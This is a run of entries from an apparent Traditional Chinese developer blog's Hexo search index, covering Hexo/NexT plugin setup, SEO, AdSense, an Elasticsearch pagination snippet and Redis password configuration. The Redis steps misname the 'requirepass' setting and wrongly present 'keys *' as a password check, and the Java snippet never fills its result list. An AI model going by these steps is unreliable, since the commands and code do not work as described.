<h3 id="quicklink"><a href="#quicklink" class="headerlink" title="quicklink"></a>quicklink</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Google Chrome Labs推出quicklink，用以實現prefetch。</span><br><span class="line">https://github.com/GoogleChromeLabs/quicklink/</span><br><span class="line"></span><br><span class="line">功能:先預載可能要用的資源，達到在使用時是順暢的體驗。</span><br><span class="line"></span><br><span class="line">安裝lib:</span><br><span class="line">$ npm install --save quicklink</span><br><span class="line"></span><br><span class="line">修改 /themes/next/_config.yml</span><br><span class="line">quicklink:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Home page and archive page can be controlled through home and archive options below.</span></span><br><span class="line">  <span class="comment"># This configuration item is independent of `enable`.</span></span><br><span class="line">  home: <span class="literal">true</span></span><br><span class="line">  archive: <span class="literal">true</span></span><br><span class="line">  </span><br><span class="line">vendors:</span><br><span class="line">  quicklink: //cdn.jsdelivr.net/npm/quicklink@2.2.0/dist/quicklink.umd.js</span><br><span class="line"></span><br><span class="line">memo: quicklink版本要設定為最新版，F12查看console才不會有錯誤訊息。</span><br></pre></td></tr></table></figure>

<h3 id="hexo-neat"><a href="#hexo-neat" class="headerlink" title="hexo-neat"></a>hexo-neat</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">功能:靜態資源壓縮</span><br><span class="line"></span><br><span class="line">安裝lib:</span><br><span class="line">$ npm install hexo-neat --save</span><br><span class="line"></span><br><span class="line">修改 /root/_config.yml</span><br><span class="line">neat_enable: <span class="literal">true</span></span><br><span class="line">neat_html:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  exclude: </span><br><span class="line">neat_css:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  exclude:</span><br><span class="line">    - <span class="string">&#x27;**/*.min.css&#x27;</span></span><br><span class="line">neat_js:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  mangle: <span class="literal">true</span></span><br><span class="line">  output:</span><br><span class="line">  compress:</span><br><span class="line">  exclude:</span><br><span class="line">    - <span class="string">&#x27;**/*.min.js&#x27;</span></span><br><span class="line">    - <span class="string">&#x27;**/jquery.fancybox.pack.js&#x27;</span></span><br><span class="line">    - <span class="string">&#x27;**/index.js&#x27;</span></span><br><span class="line">    - <span class="string">&#x27;**/fireworks.js&#x27;</span></span><br><span class="line"></span><br><span class="line">memo:在最下方加入即可</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NextT</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Generate Empty Files</title>
    <url>/posts/c6a83db6/</url>
    <content><![CDATA[<h3 id="Hexo-Generate-Empty-Files"><a href="#Hexo-Generate-Empty-Files" class="headerlink" title="Hexo Generate Empty Files"></a>Hexo Generate Empty Files</h3><span id="more"></span>
<p>這篇介紹How to solve Hexo Generate Empty Files。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在localhost跑hexo s -&gt; 可正常顯示</span><br><span class="line"></span><br><span class="line">使用</span><br><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"></span><br><span class="line">hexo 產生的 HTML 是空白的</span><br><span class="line">push 上 Github Page 才發現</span><br></pre></td></tr></table></figure>

<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">node.js 版本過高 &gt; 14.0</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">重新安裝 node.js 12或13版</span><br><span class="line">即可解決</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Push GitHub To Update Categories And Tags Directory</title>
    <url>/posts/76f21ac5/</url>
    <content><![CDATA[<h3 id="Hexo-Push-GitHub-To-Update-Categories-And-Tags-Directory"><a href="#Hexo-Push-GitHub-To-Update-Categories-And-Tags-Directory" class="headerlink" title="Hexo Push GitHub To Update Categories And Tags Directory"></a>Hexo Push GitHub To Update Categories And Tags Directory</h3><span id="more"></span>
<p>這篇介紹Hexo Push GitHub To Update Categories And Tags Directory。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Hexo會有Categories和Tags分類</span><br><span class="line">有可能在編輯文章時，因大小寫關係而有兩種以上但相同分類的情況發生。</span><br><span class="line">ex: HTTP or Http</span><br><span class="line"></span><br><span class="line">https://&#123;url&#125;/categories/HTTP/</span><br><span class="line">https://&#123;url&#125;/categories/Http/</span><br><span class="line"></span><br><span class="line">上面會有一個連結會出現404錯誤，而Google search console搜尋index就會出錯。</span><br></pre></td></tr></table></figure>

<h3 id="測試情境"><a href="#測試情境" class="headerlink" title="測試情境"></a>測試情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">將Categories和Tags修正只剩一個正確名稱後</span><br><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"></span><br><span class="line">發現deploy後，GitHub上面的Categories和Tags Directory並不會更動。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">找到本機 &#123;blog&#125;/.deploy_git</span><br><span class="line">開啟 Git Bash here</span><br><span class="line"></span><br><span class="line">$ git <span class="built_in">rm</span> -r --cached categories			//刪除remote categories Directory</span><br><span class="line">$ git commit -m <span class="string">&quot;delete categories&quot;</span>	 	//commit加上註解</span><br><span class="line">$ git <span class="built_in">rm</span> -r --cached tags				//刪除remote tags Directory</span><br><span class="line">$ git commit -m <span class="string">&quot;delete tags&quot;</span>	 		//commit加上註解</span><br><span class="line">$ git push</span><br><span class="line"></span><br><span class="line">這樣GitHub上的categories和tags Directory就會消失</span><br><span class="line"></span><br><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"></span><br><span class="line">就會將新產生的Directory commit進GitHub repo.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>Git</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Upgrade SEO</title>
    <url>/posts/4bef04a0/</url>
    <content><![CDATA[<h3 id="Hexo-Upgrade-SEO"><a href="#Hexo-Upgrade-SEO" class="headerlink" title="Hexo Upgrade SEO"></a>Hexo Upgrade SEO</h3><span id="more"></span>
<p>這篇介紹How to upgrade Hexo SEO。</p>
<h3 id="hexo-abbrlink"><a href="#hexo-abbrlink" class="headerlink" title="hexo-abbrlink"></a>hexo-abbrlink</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">功能:縮短文章路徑</span><br><span class="line"></span><br><span class="line">安裝lib:</span><br><span class="line">$ npm install hexo-abbrlink --save</span><br><span class="line"></span><br><span class="line">修改 /root/_config.yml</span><br><span class="line">url: <span class="comment">#網址url必須設定，產生sitemap.xml才會正確</span></span><br><span class="line">permalink: posts/:abbrlink/</span><br><span class="line"></span><br><span class="line">abbrlink:</span><br><span class="line">  alg: crc32      <span class="comment">#support crc16(default) and crc32</span></span><br><span class="line">  rep: hex        <span class="comment">#support dec(default) and hex</span></span><br><span class="line"></span><br><span class="line">memo:最下方加入即可</span><br><span class="line"></span><br><span class="line">attention: .md內的 layout: 必須移除，在hexo g 才會針對每個.md產生 abbrlink:</span><br></pre></td></tr></table></figure>

<h3 id="hexo-filter-nofollow"><a href="#hexo-filter-nofollow" class="headerlink" title="hexo-filter-nofollow"></a>hexo-filter-nofollow</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">功能:指示搜尋引擎不要抓取有設定nofollow的網站連結，避免分散網站權重。</span><br><span class="line"></span><br><span class="line">安裝lib:</span><br><span class="line">$ npm i hexo-filter-nofollow --save</span><br><span class="line"></span><br><span class="line">修改 /root/_config.yml</span><br><span class="line">nofollow:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  field: site</span><br><span class="line">  exclude:  <span class="comment"># 不加上 nofollow 的友情連結可以放在這邊。</span></span><br><span class="line">    - <span class="string">&#x27;https://aaa.blog&#x27;</span></span><br><span class="line">    - <span class="string">&#x27;https://bbb.com&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">新增 /root/source/robots.txt</span><br><span class="line"></span><br><span class="line">檔案內容:</span><br><span class="line">User-agent: *</span><br><span class="line">Allow: /</span><br><span class="line">Allow: /archives/</span><br><span class="line">Allow: /categories/</span><br><span class="line">Allow: /tags/ </span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Disallow: /js/</span><br><span class="line">Disallow: /css/</span><br><span class="line">Disallow: /fonts/</span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Disallow: /fancybox/</span><br><span class="line">Sitemap: https://你的網域/sitemap.xml</span><br><span class="line"></span><br><span class="line">說明:</span><br><span class="line">User-agent: * 允許所有的搜尋引擎</span><br><span class="line">Allow 允許被訪問</span><br><span class="line">Disallow 不允許被訪問</span><br></pre></td></tr></table></figure>

<h3 id="keywords-amp-description"><a href="#keywords-amp-description" class="headerlink" title="keywords &amp; description"></a>keywords &amp; description</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在/root/scaffolds/post.md 加入</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br></pre></td></tr></table></figure>

<h3 id="Google-Search-Console"><a href="#Google-Search-Console" class="headerlink" title="Google Search Console"></a>Google Search Console</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://search.google.com/search-console/about?hl=zh-tw</span><br><span class="line"></span><br><span class="line">點選立即開始</span><br><span class="line"></span><br><span class="line">網址前置字元 輸入 URL</span><br><span class="line">點選繼續</span><br><span class="line"></span><br><span class="line">這邊需經過驗證(方法有很多種</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">到 [Google Search Console後台 - Sitemap - 新增Sitemap] 填寫sitemap.xml</span><br><span class="line"></span><br><span class="line">有兩點需注意</span><br><span class="line">1.日期格式 &lt;lastmod&gt;2021-09-07&lt;/lastmod&gt; 才是正確的</span><br><span class="line">2.修改 /root/_config.yml</span><br><span class="line">url: <span class="comment">#網址url必須設定，產生sitemap.xml才會正確</span></span><br><span class="line"></span><br><span class="line">在google search site:&#123;url&#125; 確認是否能找到網站</span><br></pre></td></tr></table></figure>

<h3 id="檢測網站工具"><a href="#檢測網站工具" class="headerlink" title="檢測網站工具"></a>檢測網站工具</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://developers.google.com/speed/pagespeed/insights</span><br><span class="line">https://web.dev/measure/</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo套用next theme</title>
    <url>/posts/ecbc90dc/</url>
    <content><![CDATA[<h3 id="Hexo套用next-theme"><a href="#Hexo套用next-theme" class="headerlink" title="Hexo套用next theme"></a>Hexo套用next theme</h3><span id="more"></span>
<p>Step1:安裝NextT後, \Blog\themes下出現next資料夾<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> \blog</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><br>Step2:hexo預設使用的themes是landscape,修改blog配置文件_config.yml<br>   Step2.1:搜尋並修改 theme: next 即可啟用<br>Step3:主題設定有三種模式, Muse、Mist、Pisces、Gemini, 本Blog是採用Gemini<br>   Step3.1:修改themes的配置文件_config.yml<br>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">scheme: Gemini</span><br></pre></td></tr></table></figure><br>Step4:語言設置:修改blog配置文件_config.yml<br>    <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">language: zh-tw</span><br></pre></td></tr></table></figure></p>
<p>References <span class="exturl" data-url="aHR0cDovL3RoZW1lLW5leHQuaWlzc25hbi5jb20v">NexT 使用文档<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NextT</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo啟用站內Search</title>
    <url>/posts/95f86df4/</url>
    <content><![CDATA[<h3 id="為Hexo-NextT啟用站內搜尋功能"><a href="#為Hexo-NextT啟用站內搜尋功能" class="headerlink" title="為Hexo + NextT啟用站內搜尋功能"></a>為Hexo + NextT啟用站內搜尋功能</h3><span id="more"></span>
<p>Step1:安裝相關Plugins</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search</span><br><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
<p>Step2:對\blog_config.yml 配置文件增加以下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br></pre></td></tr></table></figure>
<p>Step3:修改 \blog\themes\next\ _config.yml 啟用local search</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/flashlab/hexo-generator-search</span></span><br><span class="line">local_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  <span class="comment"># if auto, trigger search by changing input</span></span><br><span class="line">  <span class="comment"># if manual, trigger search by pressing enter key or search button</span></span><br><span class="line">  trigger: auto</span><br><span class="line">  <span class="comment"># show top n results per article, show all results by setting to -1</span></span><br><span class="line">  top_n_per_article: 1</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo啟用Tags功能</title>
    <url>/posts/5dcb32bd/</url>
    <content><![CDATA[<h3 id="Hexo啟用Tags功能"><a href="#Hexo啟用Tags功能" class="headerlink" title="Hexo啟用Tags功能"></a>Hexo啟用Tags功能</h3><span id="more"></span>
<p>Step1:建立新page，命名為tags</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ hexo new page <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure>
<p>Step2:指令將會建立\blog\source\index.md</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">title: tags</span><br><span class="line"><span class="built_in">date</span>: 2019-09-12 09:22:12</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure>
<p>Step3:若有啟用評論功能，欲關閉時</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">title: tags</span><br><span class="line"><span class="built_in">date</span>: 2019-09-12 09:22:12</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">comments: <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>Step4:修改\blog\themes\next_config.yml 配置文件，啟用tags</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || home</span><br><span class="line">  <span class="comment">#about: /about/ || user</span></span><br><span class="line">  tags: /tags/ || tags</span><br><span class="line">  <span class="comment">#categories: /categories/ || th</span></span><br><span class="line">  archives: /archives/ || archive</span><br><span class="line">  <span class="comment">#schedule: /schedule/ || calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || heartbeat</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo NextT Upgrade</title>
    <url>/posts/458d88d0/</url>
    <content><![CDATA[<h2 id="Hexo-NextT-Upgrade"><a href="#Hexo-NextT-Upgrade" class="headerlink" title="Hexo NextT Upgrade"></a>Hexo NextT Upgrade</h2><span id="more"></span>
<p>這篇介紹How to upgrade Hexo &amp; NextT。</p>
<h2 id="Step-By-Step"><a href="#Step-By-Step" class="headerlink" title="Step By Step:"></a>Step By Step:</h2><p>Version-<br>Hexo: 5.4.0<br>NextT: 8.7.0</p>
<p>1.重建Hexo資料夾，安裝最新版本Hexo<br>$ hexo init newMyblog<br>$ cd newMyblog<br>$ npm install<br>$ npm install hexo-deployer-git –save<br>$ npm install hexo-admin –save</p>
<p>2.比對新舊Hexo root資料夾下的_config.yml<br>因新舊_config.yml選項兩邊不同，需要比對將舊的設定移植至新的_config.yml</p>
<p>3.將舊的 &#x2F;source&#x2F; 下全部複製至新的 &#x2F;source&#x2F;<br>此步驟是移植blog文章</p>
<p>4.安裝最新版NextT主題<br>$ cd newMyblog<br>$ git clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25leHQtdGhlbWUvaGV4by10aGVtZS1uZXh0">https://github.com/next-theme/hexo-theme-next<i class="fa fa-external-link-alt"></i></span> themes&#x2F;next</p>
<p>5.啟用root資料夾下的_config.yml的theme:<br>theme: next</p>
<p>6.比對新舊 &#x2F;themes&#x2F;next 資料夾下的_config.yml<br>一樣用比對的方式將舊的設定移植去新的設定<br>memo: 設定有新增、被移除、或換位置，需逐行比對</p>
<ol start="7">
<li>debug<br>$ hexo clean<br>$ hexo g<br>$ hexo s</li>
</ol>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NextT</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Apply Google Adsense And Use For Hexo8 Version</title>
    <url>/posts/9d232f3f/</url>
    <content><![CDATA[<h3 id="How-To-Apply-Google-Adsense-And-Use-For-Hexo8-Version"><a href="#How-To-Apply-Google-Adsense-And-Use-For-Hexo8-Version" class="headerlink" title="How To Apply Google Adsense And Use For Hexo8 Version"></a>How To Apply Google Adsense And Use For Hexo8 Version</h3><span id="more"></span>
<p>這篇介紹How To Apply Google Adsense And Use For Hexo8 Version。</p>
<h3 id="How-To-Apply-Google-Adsense"><a href="#How-To-Apply-Google-Adsense" class="headerlink" title="How To Apply Google Adsense"></a>How To Apply Google Adsense</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">自建部落格從2019-2021剛滿兩年，申請Google Adsense成為Google的夥伴一份子。</span><br><span class="line">申請條件:</span><br><span class="line">有文章提到部落格要滿半年以上，有效文章達50篇以上。</span><br><span class="line">但這邊有意申請的小夥伴，如果有幾十篇文章，就建議申請看看。(看Google回覆什麼~)</span><br><span class="line"></span><br><span class="line">在瀏覽器輸入 site:https//&#123;your site domain&#125; 看看自己的網站在Google上是否能被搜尋到~</span><br><span class="line">可搜尋本部落格 sitemap.xml or robots.txt 關鍵字參考</span><br><span class="line"></span><br><span class="line">Google Adsense 使用 Gmail登入</span><br><span class="line">1.先將網站domain輸入並等待審核</span><br><span class="line">2.將程式碼複製貼上 <span class="built_in">source</span>\_data\head.njk 該檔案</span><br><span class="line"></span><br><span class="line">code example:</span><br><span class="line">&lt;script data-ad-client=<span class="string">&quot;ca-pub-xxxxxxxxxxxxxxx&quot;</span> async src=<span class="string">&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Use-For-Hexo8-Version"><a href="#Use-For-Hexo8-Version" class="headerlink" title="Use For Hexo8 Version"></a>Use For Hexo8 Version</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">審核通過後，會寄信通知可以開始啟用</span><br><span class="line">1.新增ads.txt到網站根目錄(該檔案可在Google adsense後台下載)，若新增成功可在 https://&#123;your site domain&#125;/ads.txt 看到自己的資訊 </span><br><span class="line">2.選擇左邊側邊列 -&gt; 按廣告單元 -&gt; 建立多媒體廣告(需為廣告單元命名) -&gt; 下方會出現一行廣告單元 -&gt; 後面有取得程式碼按鈕</span><br><span class="line">會出現以下:</span><br><span class="line">將廣告單元程式碼複製並貼到網頁的 &lt;body&gt;&lt;/body&gt; 代碼之間</span><br><span class="line">在您要顯示廣告的位置加入這段程式碼。所有網頁上的每一個廣告單元都需要完成這項操作。</span><br><span class="line"></span><br><span class="line">&lt;script async src=<span class="string">&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-xxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">     crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- 廣告單元名稱 --&gt;</span><br><span class="line">&lt;ins class=<span class="string">&quot;adsbygoogle&quot;</span></span><br><span class="line">     style=<span class="string">&quot;display:block&quot;</span></span><br><span class="line">     data-ad-client=<span class="string">&quot;ca-pub-xxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">     data-ad-slot=<span class="string">&quot;xxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">     data-ad-format=<span class="string">&quot;auto&quot;</span></span><br><span class="line">     data-full-width-responsive=<span class="string">&quot;true&quot;</span>&gt;&lt;/ins&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">     (adsbygoogle = window.adsbygoogle || []).push(&#123;&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">3.將上述程式碼貼上 </span><br><span class="line"><span class="built_in">source</span>\_data\sidebar.njk</span><br><span class="line"><span class="built_in">source</span>\_data\post-meta.njk</span><br><span class="line"><span class="built_in">source</span>\_data\post-body-end.njk</span><br><span class="line"></span><br><span class="line">4.部署</span><br><span class="line">hexo clean</span><br><span class="line">hexo g -d</span><br><span class="line"></span><br><span class="line">5.對網站右鍵 -&gt; 檢視網頁原始碼 -&gt; 搜尋data-ad-slot=<span class="string">&quot;xxxxxxxxxxxxxxx&quot;</span> 確認有沒有部署成功</span><br><span class="line"></span><br><span class="line">6.修改 themes\next\_config.yml</span><br><span class="line">搜尋 custom_file_path</span><br><span class="line">將</span><br><span class="line">  sidebar: <span class="built_in">source</span>/_data/sidebar.njk</span><br><span class="line">  postMeta: <span class="built_in">source</span>/_data/post-meta.njk</span><br><span class="line">  postBodyEnd: <span class="built_in">source</span>/_data/post-body-end.njk</span><br><span class="line">開啟</span><br><span class="line"></span><br><span class="line">7.大約等待一小時後確認網站有沒有出現廣告</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>GoogleAdsense</category>
      </categories>
      <tags>
        <tag>GoogleAdsense</tag>
        <tag>Hexo8</tag>
      </tags>
  </entry>
  <entry>
    <title>HighLevelApi For ElasticSearch 查詢超過 10000 筆</title>
    <url>/posts/e7ad54d/</url>
    <content><![CDATA[<h3 id="HighLevelApiForElasticSearch-查詢超過10000筆作法"><a href="#HighLevelApiForElasticSearch-查詢超過10000筆作法" class="headerlink" title="HighLevelApiForElasticSearch 查詢超過10000筆作法"></a>HighLevelApiForElasticSearch 查詢超過10000筆作法</h3><span id="more"></span>
<p>這篇介紹HighLevelApiForElasticSearch 查詢超過10000筆作法。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static List&lt;Detail&gt; getDetail(String userId) &#123;</span><br><span class="line">	SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class="line">	BoolQueryBuilder boolQueryBuilder = QueryBuilders.boolQuery();</span><br><span class="line"></span><br><span class="line">	boolQueryBuilder.filter(QueryBuilders.termQuery(<span class="string">&quot;userId&quot;</span>, userId));</span><br><span class="line">	</span><br><span class="line">	sourceBuilder.query(boolQueryBuilder);</span><br><span class="line">	sourceBuilder.size(ELKManager.MAX_REQUEST_SIZE);</span><br><span class="line"></span><br><span class="line">	List&lt;Detail&gt; details = new ArrayList&lt;Detail&gt;();</span><br><span class="line"></span><br><span class="line">	Object[] sortValues = null;</span><br><span class="line">	SearchHit[] searchHits;</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (sortValues != null) &#123;</span><br><span class="line">			sourceBuilder.searchAfter(sortValues);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		SearchResponse searchResponse = ELKManager.search(sourceBuilder, INDEX_NAME_PREFIX + <span class="string">&quot;*&quot;</span>);</span><br><span class="line">		searchHits = searchResponse.getHits().getHits();</span><br><span class="line">		<span class="keyword">if</span> (searchHits.length &gt; 0) &#123;</span><br><span class="line">			Iterator&lt;SearchHit&gt; iterator = searchResponse.getHits().iterator();</span><br><span class="line">			<span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">				Detail detail = new Detail();</span><br><span class="line">				Map&lt;String, Object&gt; result = iterator.next().getSourceAsMap();</span><br><span class="line">				detail.setUserId((String) result.get(&quot;userId&quot;));</span><br><span class="line">				detail.setPassWord((String) result.get(&quot;passWord&quot;));</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			sortValues = searchResponse.getHits().getAt(searchHits.length - 1).getSortValues();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (searchHits.length &gt; 0);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> details;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Add Gitlab Project Auth For Member</title>
    <url>/posts/173e0776/</url>
    <content><![CDATA[<h3 id="How-To-Add-Gitlab-Project-Auth-For-Member"><a href="#How-To-Add-Gitlab-Project-Auth-For-Member" class="headerlink" title="How To Add Gitlab Project Auth For Member"></a>How To Add Gitlab Project Auth For Member</h3><span id="more"></span>
<p>這篇介紹How To Add Gitlab Project Auth For Member。</p>
<h3 id="Step-by-step"><a href="#Step-by-step" class="headerlink" title="Step by step"></a>Step by step</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">登入Gitlab 選擇欲修改Project</span><br><span class="line">在Project下方的Manage -&gt; 選擇Members</span><br><span class="line">右方視窗右上角會有invite members 可以使用帳號或是email加入人員</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Gitlab</category>
      </categories>
      <tags>
        <tag>Gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Check Redis ERR AUTH Password</title>
    <url>/posts/fdb7d82c/</url>
    <content><![CDATA[<h3 id="How-To-Check-Redis-ERR-AUTH-Password"><a href="#How-To-Check-Redis-ERR-AUTH-Password" class="headerlink" title="How To Check Redis ERR AUTH Password"></a>How To Check Redis ERR AUTH Password</h3><span id="more"></span>
<p>這篇介紹How To Check Redis ERR AUTH Password。</p>
<h3 id="錯誤訊息-amp-設定password"><a href="#錯誤訊息-amp-設定password" class="headerlink" title="錯誤訊息&amp;設定password"></a>錯誤訊息&amp;設定password</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ERR AUTH&lt;password&gt; called without anypassword configured <span class="keyword">for</span> the default user.</span><br><span class="line"></span><br><span class="line">1.檢查Redis是否正常啟動</span><br><span class="line">$ redis-cli</span><br><span class="line"></span><br><span class="line">2.檢查Redis密碼</span><br><span class="line">$ keys *</span><br><span class="line">$ (empty array)  -&gt; 沒有設置密碼</span><br><span class="line"></span><br><span class="line">3.設定Redis密碼</span><br><span class="line">$ config <span class="built_in">set</span> requirpass &#123;password&#125;</span><br><span class="line">$ OK</span><br><span class="line"></span><br><span class="line">4.檢查密碼是否設置成功</span><br><span class="line">$ auth &#123;password&#125;</span><br><span class="line">$ OK</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Change Jre To Zulu Jdk Path</title>
    <url>/posts/1abbf144/</url>
    <content><![CDATA[<h3 id="How-To-Change-Jre-To-Zulu-Jdk-Path"><a href="#How-To-Change-Jre-To-Zulu-Jdk-Path" class="headerlink" title="How To Change Jre To Zulu Jdk Path"></a>How To Change Jre To Zulu Jdk Path</h3><span id="more"></span>
<p>這篇介紹How To Change Jre To Zulu Jdk Path。</p>
<h3 id="Step-by-step"><a href="#Step-by-step" class="headerlink" title="Step by step"></a>Step by step</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Eclipse -&gt; Window -&gt; Preferences -&gt; Java -&gt; Installd JREs -&gt; select -&gt; Edit -&gt; Modify JRE home</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eclipse</category>
      </categories>
      <tags>
        <tag>JDK</tag>
        <tag>Eclipse</tag>
        <tag>Jre</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Change Git Directory For SourceTree</title>
    <url>/posts/8f9e52f2/</url>
